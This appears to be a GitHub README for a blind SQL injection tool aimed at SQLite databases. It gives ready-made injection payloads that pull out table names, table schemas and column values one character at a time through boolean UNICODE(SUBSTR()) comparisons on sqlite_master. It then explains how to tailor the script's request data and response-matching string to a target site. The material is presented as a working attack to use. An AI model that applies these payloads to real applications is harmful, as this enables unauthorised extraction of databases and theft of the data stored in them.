## SQLiteBLINDInjection <br/> [Author](https://github.com/aykutcanustun): aykutcanustun

## How To Set Queries:
To retrieve table names from database: <br/>
' or UNICODE(SUBSTR((SELECT name FROM sqlite_master WHERE type='table'),{},1)){} {} -- <br/><br/>
To retrieve table schema: <br/>
' or UNICODE(SUBSTR((SELECT sql FROM sqlite_master WHERE tbl_name='$TABLE_NAME'),{},1)){} {} -- <br/><br/>
To retrieve values inside column: <br/>
' or UNICODE(SUBSTR((SELECT $COLUMN_NAME FROM sqlite_master WHERE tbl_name='$TABLE_NAME'),{},1)){} {} -- <br/><br/>
**Replace $TABLE_NAME and $COLUMN_NAME with data that you retrieved from privious query!**

## How To Set Varibles:
To use the script, you have to set varibles according to your request's header, data and response etc. <br/>
I marked these lines with comments in main.py! <br/>
Make changes at these lines: <br/>
![replacements](https://github.com/aykutcanustun/SQLiteBLINDInjection/blob/master/replacements.png) <br/>
Replace "username" string with your request's data as below: <br/>
![request](https://github.com/aykutcanustun/SQLiteBLINDInjection/blob/master/request.png) <br/>
You have to make this request manually to see what is the response: <br/>
' or UNICODE(SUBSTR((SELECT name FROM sqlite_master WHERE type='table'),1,1)) < 128 -- <br/>
And replace "Data Sent!" string according to your manual request's reply: <br/>
![response](https://github.com/aykutcanustun/SQLiteBLINDInjection/blob/master/response.png)
